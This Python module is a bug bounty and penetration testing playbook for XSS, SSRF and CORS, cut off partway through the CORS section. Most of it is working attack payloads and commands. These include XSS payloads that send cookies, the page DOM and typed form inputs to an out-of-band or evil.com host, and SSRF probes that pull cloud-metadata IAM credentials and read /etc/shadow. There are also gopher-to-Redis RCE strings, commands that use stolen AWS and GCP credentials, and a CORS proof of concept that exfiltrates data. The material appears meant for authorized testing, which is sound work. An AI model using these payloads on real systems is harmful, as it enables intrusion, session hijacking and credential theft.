"""
vuln_methodologies.py — Comprehensive bug bounty / penetration testing methodologies.

Covers 6 vulnerability classes with 20-30 steps each, including all subtypes,
advanced/edge cases, actual payloads, tool commands, and step-by-step procedures.

Sources synthesised: HackTricks, PortSwigger Web Security Academy, OWASP WSTG v4.2,
PayloadsAllTheThings, ProjectDiscovery nuclei-templates, jwt_tool docs, OAuth WSTG.

Each entry:
  "title"       — Display name
  "wstg_ids"    — Relevant OWASP WSTG v4.2 test IDs
  "tools"       — Recommended tooling
  "steps"       — Ordered list of testing steps (dicts with id, name, detail, payloads?, commands?)
"""

VULN_METHODOLOGIES: dict = {

# ─────────────────────────────────────────────────────────────────────────────
# 1. XSS — Cross-Site Scripting
# ─────────────────────────────────────────────────────────────────────────────
"xss": {
    "title": "Cross-Site Scripting (XSS)",
    "wstg_ids": ["WSTG-CLNT-01", "WSTG-CLNT-02", "WSTG-CLNT-03"],
    "tools": ["dalfox", "XSStrike", "Burp Suite", "nuclei", "kxss", "gxss", "bxss"],
    "steps": [
        {
            "id": "xss_01",
            "name": "Enumerate all input surfaces",
            "detail": (
                "Crawl the target with katana or gospider to collect every URL, "
                "form field, JSON parameter, header, and path segment that is "
                "reflected in responses. Include URL fragments (#hash), "
                "postMessage listeners, and WebSocket messages."
            ),
            "commands": [
                "katana -u https://TARGET -jc -ef css,png,jpg -o endpoints.txt",
                "gospider -s https://TARGET -o crawl/ -c 10 -d 5",
            ],
        },
        {
            "id": "xss_02",
            "name": "Identify reflection points with unique canary strings",
            "detail": (
                "Send a unique alphanumeric probe (e.g., xssCANARY1337) in every "
                "parameter. Grep responses for the canary to confirm where and how "
                "input is reflected: inside tags, in attributes, in JS strings, "
                "in JSON, or in CSS context."
            ),
            "payloads": ["xssCANARY1337", "XSSPROBEX"],
            "commands": [
                "ffuf -u 'https://TARGET/page?q=FUZZ' -w params.txt -mr 'xssCANARY1337'",
            ],
        },
        {
            "id": "xss_03",
            "name": "Reflected XSS — basic HTML context",
            "detail": (
                "When reflection is inside HTML body, break out with tag payloads. "
                "Try variations to defeat simple filters. "
                "Confirm execution in a real browser."
            ),
            "payloads": [
                "<script>alert(document.domain)</script>",
                "<img src=x onerror=alert(1)>",
                "<svg onload=alert(1)>",
                "<details open ontoggle=alert(1)>",
                "<iframe src=javascript:alert(1)>",
                "'\"><script>alert(1)</script>",
                "<input autofocus onfocus=alert(1)>",
                "<video><source onerror=alert(1)>",
                "<audio src=1 onerror=alert(1)>",
                "<body onload=alert(1)>",
            ],
        },
        {
            "id": "xss_04",
            "name": "Reflected XSS — attribute context",
            "detail": (
                "When reflection is inside an HTML attribute value, escape the "
                "attribute and inject an event handler. Test both double-quote "
                "and single-quote delimited attributes."
            ),
            "payloads": [
                "\" autofocus onfocus=alert(1) x=\"",
                "' autofocus onfocus=alert(1) x='",
                "\" onmouseover=alert(1) x=\"",
                "\"><img src=x onerror=alert(1)>",
                "javascript:alert(1)",
            ],
        },
        {
            "id": "xss_05",
            "name": "Reflected XSS — JavaScript string context",
            "detail": (
                "When reflection lands inside a JS string (e.g., var x='INPUT'), "
                "break out of the string and inject JS. Try backslash escaping too."
            ),
            "payloads": [
                "';alert(1)//",
                "\";alert(1)//",
                "\\';alert(1)//",
                "</script><script>alert(1)</script>",
                "${alert(1)}",
                "`${alert(1)}`",
                "\u003cimg src=x onerror=alert(1)\u003e",
            ],
        },
        {
            "id": "xss_06",
            "name": "Stored XSS — persistent input fields",
            "detail": (
                "Test every persistently stored field: comments, profiles, usernames, "
                "addresses, bio, notes, support tickets, product reviews, file names. "
                "Payload must survive storage AND render in another user's browser. "
                "Use blind XSS callbacks to confirm without seeing the render."
            ),
            "payloads": [
                "<script src=https://YOUR_OOB_SERVER/xss.js></script>",
                "<img src=x onerror=\"var x=new Image();x.src='https://YOUR_OOB/c?'+document.cookie\">",
                "<svg><script>fetch('https://YOUR_OOB/?c='+btoa(document.cookie))</script></svg>",
            ],
        },
        {
            "id": "xss_07",
            "name": "Blind XSS — out-of-band confirmation",
            "detail": (
                "For fields rendered in admin panels, email templates, or support "
                "dashboards not visible to the tester, use a blind XSS server "
                "(XSS Hunter, bXSS, or a custom endpoint). Inject a payload that "
                "phones home with cookies, URL, DOM screenshot."
            ),
            "commands": [
                "# Setup bXSS server",
                "docker run -d -p 3000:3000 LewisArdern/bXSS",
                "# Inject payload into every stored field",
                "# Payload: <script src=https://BXSS_SERVER/payload.js></script>",
            ],
        },
        {
            "id": "xss_08",
            "name": "DOM XSS — source/sink analysis",
            "detail": (
                "Identify dangerous DOM sources: location.hash, location.search, "
                "document.referrer, window.name, postMessage data. "
                "Identify dangerous sinks: innerHTML, document.write, eval, "
                "setTimeout(string), location.href assignment, jQuery html(). "
                "Use DOM Invader (Burp) or manual JS review."
            ),
            "payloads": [
                "https://TARGET/#<img src=x onerror=alert(1)>",
                "https://TARGET/?q=</script><script>alert(1)</script>",
                "https://TARGET/?callback=alert(1)//",
            ],
            "commands": [
                "# Use Burp DOM Invader",
                "# Or grep JS files for dangerous sinks",
                "grep -rE '(innerHTML|document\\.write|eval\\(|location\\.href)' *.js",
            ],
        },
        {
            "id": "xss_09",
            "name": "DOM XSS — postMessage hijacking",
            "detail": (
                "Find window.addEventListener('message') in JS. Determine if it "
                "checks event.origin. If not (or weak check), craft a malicious "
                "parent page that sends a message triggering XSS in the target. "
                "Also test opener-based attacks: window.opener.postMessage."
            ),
            "payloads": [
                # HTML page to host and test with
                "<script>window.open('https://TARGET');setTimeout(()=>{"
                "window.frames[0].postMessage('<img src=x onerror=alert(1)>','*')"
                "},2000)</script>",
            ],
        },
        {
            "id": "xss_10",
            "name": "Mutation XSS (mXSS) — parser differentials",
            "detail": (
                "mXSS occurs when a sanitiser passes safe HTML but the browser's "
                "HTML parser mutates it back into executable XSS. Test with payloads "
                "that exploit parser behaviour on table elements, template tags, "
                "math/svg namespaces, and nested structures. DOMPurify < 2.0.1 "
                "and older sanitisers are vulnerable."
            ),
            "payloads": [
                "<table><tbody><tr><td><noscript><p></noscript><img src=x onerror=alert(1)></td></tr></tbody></table>",
                "<svg><p><style><g title=\"</style><img src=x onerror=alert(1)>\">",
                "<math><mtext></table><img src=x onerror=alert(1)>",
                "<svg><foreignObject><math><mi><img src=x onerror=alert(1)></mi></math></foreignObject></svg>",
                "<!--<img src=\"--><img src=x onerror=alert(1)//\">",
            ],
        },
        {
            "id": "xss_11",
            "name": "CSP bypass techniques",
            "detail": (
                "Retrieve CSP header: Content-Security-Policy. Analyse with "
                "csp-evaluator.withgoogle.com. Common bypasses: "
                "(1) JSONP endpoints on whitelisted CDNs, "
                "(2) Angular sandbox escape if angular.js on CDN whitelist, "
                "(3) data: URI if allowed, "
                "(4) script-src 'unsafe-eval' + DOM gadget, "
                "(5) base-uri missing — inject <base href=> to redirect relative script loads, "
                "(6) object-src missing — Flash injection (legacy), "
                "(7) report-uri only — no enforce, "
                "(8) strict-dynamic with nonce reuse."
            ),
            "payloads": [
                # JSONP bypass (if ajax.googleapis.com whitelisted)
                "<script src=https://ajax.googleapis.com/ajax/libs/angularjs/1.6.0/angular.min.js></script>"
                "<div ng-app>{{constructor.constructor('alert(1)')()}}</div>",
                # base-uri bypass
                "<base href=https://evil.com>",
                # nonce exfil
                "<script nonce=LEAKED_NONCE>alert(1)</script>",
            ],
            "commands": [
                "curl -sI https://TARGET | grep -i content-security-policy",
                "# Analyse: https://csp-evaluator.withgoogle.com/",
            ],
        },
        {
            "id": "xss_12",
            "name": "Dangling markup injection",
            "detail": (
                "When full script execution is blocked by CSP, inject a dangling "
                "attribute that exfiltrates page content via an img src request. "
                "Useful for stealing CSRF tokens from other pages."
            ),
            "payloads": [
                "'\"><img src='https://evil.com/?",
                "'\"><img src='//evil.com/steal?data=",
            ],
        },
        {
            "id": "xss_13",
            "name": "SVG and XML-based XSS",
            "detail": (
                "SVG files are XML documents that execute JS when rendered inline. "
                "Upload SVG files or inject SVG payloads. Also test XHTML namespace "
                "injection and XML+XSLT injection."
            ),
            "payloads": [
                '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>',
                '<svg><use href="data:image/svg+xml,<svg id=\'x\' xmlns=\'http://www.w3.org/2000/svg\'><script>alert(1)</script></svg>#x"/>',
                '<?xml version="1.0"?><html xmlns="http://www.w3.org/1999/xhtml"><script>alert(1)</script></html>',
                '<svg onload=alert(1) xmlns="http://www.w3.org/2000/svg"/>',
            ],
        },
        {
            "id": "xss_14",
            "name": "Template injection leading to XSS (SSTI → XSS)",
            "detail": (
                "Server-side template engines that output HTML without escaping "
                "can produce XSS. Test for SSTI first ({{7*7}} → 49), then escalate "
                "to DOM output. Client-side template injection (AngularJS, Vue) "
                "can execute JS directly in the sandbox."
            ),
            "payloads": [
                "{{constructor.constructor('alert(1)')()}}",           # AngularJS CSTI
                "{{7*7}}",                                              # SSTI detection
                "${alert(1)}",                                          # Thymeleaf CSTI
                "#{alert(1)}",                                          # Ruby ERB
            ],
        },
        {
            "id": "xss_15",
            "name": "Prototype pollution leading to XSS",
            "detail": (
                "Prototype pollution in JS sets properties on Object.prototype. "
                "If a sink reads a polluted property (e.g., innerHTML from opts.html), "
                "it triggers XSS. Test via URL (?__proto__[x]=<img>) and JSON body."
            ),
            "payloads": [
                "?__proto__[innerHTML]=<img src=x onerror=alert(1)>",
                "?constructor[prototype][innerHTML]=<img src=x onerror=alert(1)>",
                '{"__proto__":{"innerHTML":"<img src=x onerror=alert(1)>"}}',
                "?__proto__[srcdoc]=<script>alert(1)</script>",
            ],
            "commands": [
                "# Use ppmap for automated detection",
                "ppmap -u 'https://TARGET/page?FUZZ=test'",
            ],
        },
        {
            "id": "xss_16",
            "name": "Filter bypass — encoding and obfuscation",
            "detail": (
                "Apply encoding layers when basic payloads are blocked: "
                "HTML entity encode (&#x61;), URL encode (%3C), double URL encode, "
                "Unicode escape (\\u003c), null bytes (%00), case variation (ScRiPt), "
                "comment insertion (/* */), backtick substitution, eval with char codes."
            ),
            "payloads": [
                "<IMG SRC=x ONERROR=&#x61;&#x6C;&#x65;&#x72;&#x74;(1)>",
                "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",
                "<svg/onload=\\u0061lert(1)>",
                "<<script>alert(1)//<</script>",
                "<sc<script>ript>alert(1)</sc</script>ript>",
                '<iframe srcdoc="&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;">',
                "<img src=x onerror=setTimeout`alert\x281\x29`>",
            ],
        },
        {
            "id": "xss_17",
            "name": "XSS via HTTP headers",
            "detail": (
                "Test reflection of Referer, User-Agent, X-Forwarded-For, "
                "X-Forwarded-Host, X-Original-URL, Accept-Language headers. "
                "Inject payloads in each. Particularly check error pages and "
                "log display interfaces."
            ),
            "commands": [
                "curl -H 'User-Agent: <script>alert(1)</script>' https://TARGET",
                "curl -H 'Referer: <script>alert(1)</script>' https://TARGET",
                "curl -H 'X-Forwarded-For: <script>alert(1)</script>' https://TARGET",
            ],
        },
        {
            "id": "xss_18",
            "name": "XSS in JSON endpoints — content-type confusion",
            "detail": (
                "Some apps render JSON responses as HTML if the Content-Type header "
                "is missing or wrong. Test: remove Accept header, set Accept: text/html. "
                "Also test JSONP endpoints where callback= is reflected unescaped."
            ),
            "payloads": [
                "?callback=<script>alert(1)</script>",
                "?callback=alert(1);//",
                "?jsonp=alert(document.domain)//",
            ],
        },
        {
            "id": "xss_19",
            "name": "Automated XSS scanning with dalfox",
            "detail": (
                "Run dalfox against discovered endpoints for automated reflected "
                "and DOM XSS detection with WAF bypass built-in."
            ),
            "commands": [
                "dalfox url 'https://TARGET/page?q=test' --silence",
                "dalfox file endpoints.txt -o dalfox_results.txt",
                "cat urls.txt | dalfox pipe --skip-grepping",
                "dalfox url 'https://TARGET' --custom-payload payloads.txt --waf-evasion",
            ],
        },
        {
            "id": "xss_20",
            "name": "Automated XSS scanning with XSStrike",
            "detail": (
                "XSStrike uses context-aware payload generation and WAF bypass techniques."
            ),
            "commands": [
                "xsstrike -u 'https://TARGET/page?q=test' --crawl",
                "xsstrike -u 'https://TARGET' --skip-dom --blind",
            ],
        },
        {
            "id": "xss_21",
            "name": "XSS via file upload (SVG, HTML, XML)",
            "detail": (
                "Upload SVG/HTML/XML files if accepted. SVG with <script> executes "
                "when rendered inline. HTML uploads execute in the app's origin. "
                "Test MIME type sniffing: upload PHP as image and check if served "
                "with text/html causing XSS via content sniffing."
            ),
            "payloads": [
                '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(document.cookie)</script></svg>',
                '<html><body><script>alert(1)</script></body></html>',
            ],
        },
        {
            "id": "xss_22",
            "name": "DOM clobbering",
            "detail": (
                "Inject HTML that clobbers DOM properties used by scripts. "
                "For example: <a id=config href=malicious> clobbers window.config. "
                "When the script reads window.config.url, it reads the href."
            ),
            "payloads": [
                '<a id=config href="javascript:alert(1)">',
                '<form id=x><input id=action value=javascript:alert(1)>',
                '<img name=src src=x onerror=alert(1)>',
            ],
        },
        {
            "id": "xss_23",
            "name": "XSS in markdown / rich text editors",
            "detail": (
                "Many markdown renderers are vulnerable. Test: "
                "[XSS](javascript:alert(1)), "
                "![x](x onerror=alert(1)), "
                "HTML embedding if allowed, "
                "and mXSS through nested formatting."
            ),
            "payloads": [
                "[XSS](javascript:alert(1))",
                "![img](x onerror=alert(1))",
                "<script>alert(1)</script>",
                "[a](javascript:prompt(document.cookie))",
                "**<img src=x onerror=alert(1)>**",
            ],
        },
        {
            "id": "xss_24",
            "name": "XSS exfiltration payloads for impact demonstration",
            "detail": (
                "For confirmed XSS, craft exfiltration payloads to demonstrate "
                "real impact: cookie theft, keylogging, credential harvesting, "
                "full-page screenshot, BeEF hooking."
            ),
            "payloads": [
                "fetch('https://OOB/?c='+encodeURIComponent(document.cookie))",
                "new Image().src='https://OOB/?c='+btoa(document.cookie)",
                "fetch('https://OOB/?dom='+btoa(document.documentElement.innerHTML))",
                # Credential harvest from forms
                "document.querySelectorAll('input').forEach(i=>i.addEventListener('change',e=>fetch('https://OOB/?k='+e.target.value)))",
            ],
        },
        {
            "id": "xss_25",
            "name": "Verify CSP effectiveness and report-uri leakage",
            "detail": (
                "Even if XSS payload executes, check if CSP blocks exfiltration. "
                "Verify report-uri endpoints — they may leak policy violations "
                "that reveal other users' actions."
            ),
            "commands": [
                "curl -sI https://TARGET | grep -i 'content-security-policy'",
                "# Check report-uri for info leakage",
                "nuclei -t cves/ -t exposures/ -u https://TARGET",
            ],
        },
    ],
},


# ─────────────────────────────────────────────────────────────────────────────
# 2. SSRF — Server-Side Request Forgery
# ─────────────────────────────────────────────────────────────────────────────
"ssrf": {
    "title": "Server-Side Request Forgery (SSRF)",
    "wstg_ids": ["WSTG-INPV-19"],
    "tools": ["ssrfmap", "nuclei", "interactsh", "Burp Collaborator", "ffuf", "gopherus"],
    "steps": [
        {
            "id": "ssrf_01",
            "name": "Identify SSRF injection points",
            "detail": (
                "Survey all parameters that accept URLs or hostnames: "
                "url=, src=, href=, path=, dest=, redirect=, fetch=, load=, "
                "image_url=, file=, callback=, webhook=, download=, uri=, "
                "endpoint=, proxy=, ping=, host=, domain=. "
                "Also check JSON bodies with these key names, XML elements, "
                "and HTTP headers (X-Forwarded-For, Host, Origin)."
            ),
            "commands": [
                "gau TARGET | grep -E '(url|src|href|dest|redirect|uri|path)=' | tee ssrf_params.txt",
                "waybackurls TARGET | grep -E '(url|fetch|load|webhook|ping)='",
            ],
        },
        {
            "id": "ssrf_02",
            "name": "Basic SSRF — internal network probing",
            "detail": (
                "Inject localhost and RFC-1918 addresses to probe the internal "
                "network. Compare response size/time/content to baseline to "
                "detect open vs closed ports."
            ),
            "payloads": [
                "http://127.0.0.1",
                "http://127.0.0.1:80",
                "http://127.0.0.1:443",
                "http://127.0.0.1:8080",
                "http://127.0.0.1:8443",
                "http://127.0.0.1:6379",   # Redis
                "http://127.0.0.1:5432",   # PostgreSQL
                "http://127.0.0.1:3306",   # MySQL
                "http://127.0.0.1:27017",  # MongoDB
                "http://127.0.0.1:9200",   # Elasticsearch
                "http://127.0.0.1:2379",   # etcd
                "http://localhost",
                "http://[::1]",
                "http://0.0.0.0",
                "http://0",
            ],
        },
        {
            "id": "ssrf_03",
            "name": "Cloud metadata endpoint enumeration",
            "detail": (
                "Probe cloud IMDSv1 endpoints which do not require tokens. "
                "AWS IMDSv2 requires a PUT to get a session token first — "
                "test if the server will do the two-step for you."
            ),
            "payloads": [
                # AWS EC2
                "http://169.254.169.254/latest/meta-data/",
                "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                "http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME",
                "http://169.254.169.254/latest/user-data",
                "http://169.254.169.254/latest/dynamic/instance-identity/document",
                # GCP
                "http://metadata.google.internal/computeMetadata/v1/",
                "http://metadata.google.internal/computeMetadata/v1/project/project-id",
                "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
                # Azure
                "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
                "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
                # DigitalOcean
                "http://169.254.169.254/metadata/v1/",
                # Alibaba
                "http://100.100.100.200/latest/meta-data/",
                # Oracle Cloud
                "http://169.254.169.254/opc/v1/instance/",
            ],
            "commands": [
                "# For GCP, the X-Google-Metadata-Request:True header is required",
                "# Test if server forwards custom headers:",
                "curl 'https://TARGET/fetch?url=http://metadata.google.internal/computeMetadata/v1/' -H 'X-Google-Metadata-Request: True'",
            ],
        },
        {
            "id": "ssrf_04",
            "name": "Blind SSRF — out-of-band detection",
            "detail": (
                "When no response data is returned, use an OOB callback server "
                "(Burp Collaborator, interactsh) to confirm DNS resolution or "
                "HTTP callbacks from the server."
            ),
            "payloads": [
                "http://YOUR_INTERACTSH_HOST",
                "http://YOUR_COLLABORATOR_DOMAIN",
                "https://YOUR_INTERACTSH_HOST/ssrf_test",
            ],
            "commands": [
                "interactsh-client -v -o ssrf_interactions.txt",
                "# Then inject: http://UNIQUE_ID.oast.pro in all url= parameters",
            ],
        },
        {
            "id": "ssrf_05",
            "name": "IP address filter bypass techniques",
            "detail": (
                "When 127.0.0.1 and localhost are blocked, try alternative "
                "representations that resolve to the same address."
            ),
            "payloads": [
                "http://2130706433",          # Decimal
                "http://0177.0.0.1",          # Octal
                "http://0x7f000001",          # Hex
                "http://127.000.000.001",     # Leading zeros
                "http://[::ffff:127.0.0.1]", # IPv6 mapped
                "http://[::ffff:7f00:1]",     # IPv6 hex
                "http://127.1",               # Short form
                "http://0",
                "http://localtest.me",        # DNS → 127.0.0.1
                "http://127.0.0.1.nip.io",
                "http://spoofed.burpcollaborator.net",
                "http://①②⑦.①",             # Unicode numbers
                "http://0:80",
            ],
        },
        {
            "id": "ssrf_06",
            "name": "URL parser confusion — scheme/host splitting",
            "detail": (
                "Different URL parsers split authority differently. Exploit "
                "inconsistencies between validation logic and the HTTP library's "
                "actual request."
            ),
            "payloads": [
                "http://evil.com@127.0.0.1/",
                "http://127.0.0.1#evil.com",
                "http://127.0.0.1?.evil.com",
                "http://evil.com\\@127.0.0.1",
                "http://127.0.0.1%25.evil.com",
                "http://127.0.0.1%00.evil.com",
                "http://evil.com%2f%2f127.0.0.1",
                "http:///127.0.0.1",
                "//127.0.0.1",
            ],
        },
        {
            "id": "ssrf_07",
            "name": "Protocol smuggling — Gopher, Dict, FTP",
            "detail": (
                "Gopher protocol allows crafting raw TCP payloads, enabling "
                "SSRF-to-RCE via Redis, Memcached, SMTP, and FastCGI. "
                "Use gopherus to generate payloads."
            ),
            "payloads": [
                "file:///etc/passwd",
                "file:///etc/shadow",
                "file:///proc/self/environ",
                "dict://127.0.0.1:6379/INFO",
                "gopher://127.0.0.1:6379/_INFO%0d%0a",
                # Redis RCE via gopher (set cron)
                "gopher://127.0.0.1:6379/_%2a1%0d%0a%248%0d%0aflushall%0d%0a",
                "ftp://127.0.0.1:21",
                "ldap://127.0.0.1:389",
                "sftp://127.0.0.1:22",
            ],
            "commands": [
                "# Generate gopher payloads with gopherus",
                "python3 gopherus.py --exploit redis",
                "python3 gopherus.py --exploit smtp",
                "python3 gopherus.py --exploit fastcgi",
            ],
        },
        {
            "id": "ssrf_08",
            "name": "DNS rebinding attack",
            "detail": (
                "DNS rebinding bypasses IP-based allow-lists by having the DNS "
                "initially resolve to an attacker domain (passes validation), "
                "then rebind to 127.0.0.1 (for the actual HTTP request). "
                "Use rebind.it or rbndr.us for automated rebinding."
            ),
            "payloads": [
                "http://A.8.8.8.8.1time.127.0.0.1.1time.repeat.rebind.network/",
                "http://7f000001.c0a80101.rbndr.us/",  # rbndr.us auto rebinds
            ],
        },
        {
            "id": "ssrf_09",
            "name": "SSRF via redirect chains",
            "detail": (
                "If the server follows redirects, host a redirect on an allowed "
                "domain that bounces to the internal target. 30x redirects, "
                "meta-refresh, or JavaScript redirects may all be followed."
            ),
            "commands": [
                "# Host on your server:",
                "# Location: http://169.254.169.254/latest/meta-data/",
                "curl -v 'https://TARGET/fetch?url=http://YOUR_SERVER/redirect'",
            ],
        },
        {
            "id": "ssrf_10",
            "name": "SSRF via PDF/image/webhook features",
            "detail": (
                "Features that render external content are implicit SSRF: "
                "PDF generation (url to render), image resizing (image_url=), "
                "webhook delivery (external URL), link preview, import from URL, "
                "HTML-to-PDF (wkhtmltopdf, headless Chrome), embed/iframe in editor."
            ),
        },
        {
            "id": "ssrf_11",
            "name": "SSRF to RCE escalation paths",
            "detail": (
                "With internal service access, target: "
                "(1) Redis — SET cron job or SSH key, "
                "(2) Kubernetes API — 10.96.0.1:443 or 10.0.0.1:8080, "
                "(3) Docker socket — /var/run/docker.sock, "
                "(4) Jenkins — /script endpoint, "
                "(5) Consul — /v1/kv/, "
                "(6) Spring Boot Actuator — /actuator/env, /actuator/restart."
            ),
            "payloads": [
                "http://127.0.0.1:8080/",                          # Jenkins
                "http://127.0.0.1:8500/v1/kv/",                   # Consul
                "http://10.96.0.1/api/v1/namespaces/",             # Kubernetes
                "http://127.0.0.1:2375/containers/json",           # Docker API (no TLS)
                "http://127.0.0.1:8161/api/jolokia/list",          # ActiveMQ Jolokia
                "http://127.0.0.1:4848/management/domain/",        # GlassFish
            ],
        },
        {
            "id": "ssrf_12",
            "name": "IPv6 SSRF bypass",
            "detail": (
                "IPv6 loopback [::1] may not be blocked. Also try IPv4-mapped "
                "IPv6 addresses and IPv6 link-local addresses."
            ),
            "payloads": [
                "http://[::1]/",
                "http://[::1]:80/",
                "http://[::ffff:127.0.0.1]/",
                "http://[0:0:0:0:0:ffff:7f00:1]/",
                "http://[fd00::1]/",                               # Private IPv6
                "http://[fe80::1%25eth0]/",                       # Link-local
            ],
        },
        {
            "id": "ssrf_13",
            "name": "SSRF in XML / XXE combination",
            "detail": (
                "XML parsers support external entity declarations which can fetch "
                "URLs — this is effectively SSRF via XXE. Test SOAP, XML APIs, "
                "SVG uploads, and any XML-accepting endpoint."
            ),
            "payloads": [
                '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>',
                '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
            ],
        },
        {
            "id": "ssrf_14",
            "name": "Automated SSRF scanning",
            "detail": "Use ssrfmap and nuclei SSRF templates for automated coverage.",
            "commands": [
                "python3 ssrfmap.py -r request.txt -p url -m readfiles",
                "python3 ssrfmap.py -r request.txt -p url -m portscan",
                "nuclei -t vulnerabilities/generic/generic-ssrf.yaml -u https://TARGET",
                "nuclei -t fuzzing/ssrf-via-* -u https://TARGET",
            ],
        },
        {
            "id": "ssrf_15",
            "name": "Confirm SSRF and extract credentials",
            "detail": (
                "For AWS, confirm by fetching IAM role credentials and verify "
                "the access key is valid. For GCP, fetch OAuth token. "
                "Always document the full exfiltrated credential as evidence."
            ),
            "commands": [
                "# After SSRF confirms AWS metadata:",
                "aws sts get-caller-identity --profile STOLEN_CREDS",
                "# After GCP token exfil:",
                "curl -H 'Authorization: Bearer TOKEN' 'https://www.googleapis.com/oauth2/v3/tokeninfo'",
            ],
        },
        {
            "id": "ssrf_16",
            "name": "SSRF via Host header injection",
            "detail": (
                "Password reset emails or internal requests that use the Host header "
                "for URL construction can be redirected to attacker infrastructure. "
                "Inject: Host: evil.com or add X-Forwarded-Host: evil.com."
            ),
            "commands": [
                "curl -H 'Host: evil.com' -H 'X-Forwarded-Host: evil.com' https://TARGET/reset-password",
            ],
        },
        {
            "id": "ssrf_17",
            "name": "SSRF to internal microservice enumeration",
            "detail": (
                "Once SSRF is confirmed, scan the internal IP space. Common targets: "
                "10.0.0.0/8 (AWS VPC default), 172.16.0.0/12, 192.168.0.0/16. "
                "Probe port 80, 443, 8080, 8443, 8888, 9090, 9200, 5601, 6379, 5432. "
                "Response differences (200 vs connection refused vs timeout) reveal open services."
            ),
            "commands": [
                "# Use ssrfmap port scan mode",
                "python3 ssrfmap.py -r request.txt -p url -m portscan --lport 80,443,8080,6379,9200",
                "# Or custom ffuf loop",
                "for ip in 10.0.0.{1..254}; do ffuf -u 'https://TARGET/fetch?url=http://FUZZ:80' -w <(echo $ip) -mc 200; done",
            ],
        },
        {
            "id": "ssrf_18",
            "name": "SSRF via Webpack / asset bundler import",
            "detail": (
                "Some build tools or server-side rendering apps accept a URL for "
                "template import or component loading. Test parameters named: "
                "template=, theme=, layout=, import=, module=."
            ),
            "payloads": [
                "?template=http://169.254.169.254/latest/meta-data/",
                "?layout=http://127.0.0.1:8080/",
                "?import=file:///etc/passwd",
            ],
        },
        {
            "id": "ssrf_19",
            "name": "Time-based blind SSRF detection",
            "detail": (
                "If no DNS/HTTP callback arrives but timing changes, detect SSRF via "
                "response delay: non-routable IPs (192.168.x.x with no host) may "
                "cause TCP timeout (~30s) vs a refused connection (~0ms). "
                "Compare response time for routable vs non-routable SSRF payloads."
            ),
        },
        {
            "id": "ssrf_20",
            "name": "SSRF filter bypass — URL scheme tricks",
            "detail": (
                "When http/https are filtered but not other schemes, or when "
                "the URL is partially validated, try: "
                "capitalization (HTTP://, Http://), "
                "unusual schemes (jar://, netdoc://, phar://), "
                "scheme-relative (//evil.com), "
                "whitespace padding (  http://evil.com)."
            ),
            "payloads": [
                "HTTP://127.0.0.1",
                "hTTp://127.0.0.1",
                "//127.0.0.1",
                "jar:http://127.0.0.1!/",
                "phar://127.0.0.1",
                "netdoc://127.0.0.1",
                " http://127.0.0.1",
                "\thttp://127.0.0.1",
            ],
        },
        {
            "id": "ssrf_21",
            "name": "SSRF in OAuth / OpenID Connect callback",
            "detail": (
                "OAuth redirect_uri and OpenID Connect jwks_uri parameters may be "
                "used server-side to fetch data. Test: set jwks_uri to your OOB URL "
                "during client registration. Test redirect_uri with internal URLs."
            ),
        },
    ],
},


# ─────────────────────────────────────────────────────────────────────────────
# 3. CORS — Cross-Origin Resource Sharing
# ─────────────────────────────────────────────────────────────────────────────
"cors": {
    "title": "CORS Misconfiguration",
    "wstg_ids": ["WSTG-CLNT-07"],
    "tools": ["CORScanner", "corsy", "nuclei", "Burp Suite"],
    "steps": [
        {
            "id": "cors_01",
            "name": "Baseline — map all API endpoints returning sensitive data",
            "detail": (
                "Identify which endpoints return sensitive data (JWT tokens, PII, "
                "financial data, admin resources). These are the targets for CORS "
                "exploitation. Check ACAO + ACAC header combination on each."
            ),
        },
        {
            "id": "cors_02",
            "name": "Origin reflection misconfiguration",
            "detail": (
                "Send any Origin header and observe if it is reflected in "
                "Access-Control-Allow-Origin. If ACAO = the Origin you sent AND "
                "ACAC: true, the endpoint is exploitable — any origin can read "
                "credentialed responses."
            ),
            "commands": [
                "curl -sI -H 'Origin: https://evil.com' 'https://TARGET/api/user'",
                "# Look for: Access-Control-Allow-Origin: https://evil.com",
                "# And: Access-Control-Allow-Credentials: true",
            ],
        },
        {
            "id": "cors_03",
            "name": "Null origin bypass",
            "detail": (
                "Some apps whitelist Origin: null. This can be triggered from "
                "sandboxed iframes, data: URIs, and local files. "
                "Craft a PoC with a sandboxed iframe."
            ),
            "commands": [
                "curl -sI -H 'Origin: null' 'https://TARGET/api/user'",
            ],
            "payloads": [
                # PoC HTML
                "<iframe sandbox='allow-scripts' src='data:text/html,<script>"
                "fetch(\"https://TARGET/api/sensitive\",{credentials:\"include\"})"
                ".then(r=>r.text()).then(d=>fetch(\"https://OOB/?d=\"+btoa(d)))"
                "</script>'>",
            ],
        },
        {
            "id": "cors_04",
            "name": "Subdomain wildcard misconfiguration",
            "detail": (
                "App validates that origin ends with .trusted.com — a subdomain "
                "like https://evil.trusted.com would pass. Or app uses startsWith "
                "check — try: https://trusted.com.evil.com."
            ),
            "payloads": [
                "https://evil.trusted.com",
                "https://trusted.com.evil.com",
                "https://trusted.com.example.com",
                "https://notrusted.com",
                "https://xss.trusted.com",
            ],
            "commands": [
                "# Enumerate subdomains of trusted domain — takeover may enable CORS exploit",
                "subfinder -d trusted.com -o subdomains.txt",
            ],
        },
        {
            "id": "cors_05",
            "name": "Trusted subdomain takeover + CORS exploit chain",
            "detail": (
                "If the CORS whitelist includes *.partner.com, find all partner.com "
                "subdomains and check for subdomain takeover (unclaimed CNAME targets). "
                "Takeover a subdomain → serve malicious XHR from that origin → CORS "
                "allows credential reading."
            ),
            "commands": [
                "subfinder -d trusted.com | nuclei -t takeovers/ -o takeover_results.txt",
                "# If subdomain taken over, host:",
                "# fetch('https://TARGET/api/data', {credentials:'include'}).then(r=>r.text()).then(send_to_oob)",
            ],
        },
        {
            "id": "cors_06",
            "name": "HTTP to HTTPS CORS downgrade",
            "detail": (
                "Some apps whitelist both https://trusted.com and http://trusted.com. "
